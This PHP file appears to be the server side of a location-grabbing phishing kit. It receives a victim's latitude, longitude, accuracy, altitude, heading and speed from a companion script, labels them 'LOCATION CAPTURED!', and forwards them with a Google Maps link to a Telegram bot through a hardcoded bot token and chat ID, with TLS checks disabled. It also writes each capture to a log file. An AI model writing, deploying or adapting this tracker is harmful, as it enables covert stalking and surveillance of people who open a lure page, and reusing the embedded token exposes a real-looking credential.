<?php
// ******************************************
// CONFIGURATION: PASTE YOUR REAL DETAILS HERE
// ******************************************
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
$chatId = "-1003598938463";     // Paste your -100... ID here
// ******************************************

// Receive Data (Matches keys in location.js)
$lat = $_POST['Lat'];
$lon = $_POST['Lon'];
$acc = $_POST['Acc'];
$alt = $_POST['Alt'];
$dir = $_POST['Dir'];
$spd = $_POST['Spd'];
$status = $_POST['Status'];

// Generate Google Maps Link
$googleMapsLink = "https://www.google.com/maps/place/" . $lat . "+" . $lon;

// Format Message
$message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
$message .= "<b>🌎 Latitude:</b> " . $lat . "\n";
$message .= "<b>🌎 Longitude:</b> " . $lon . "\n";
$message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
$message .= "<b>🏔 Altitude:</b> " . $alt . "\n"; // Will now just say "Sea Level"
$message .= "<b>🧭 Direction:</b> " . $dir . "\n";
$message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
$message .= "<b>🗺 <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// Save Log
$f = fopen('../../logs/result.txt', 'w+');
fwrite($f, $message);
fclose($f);
?>
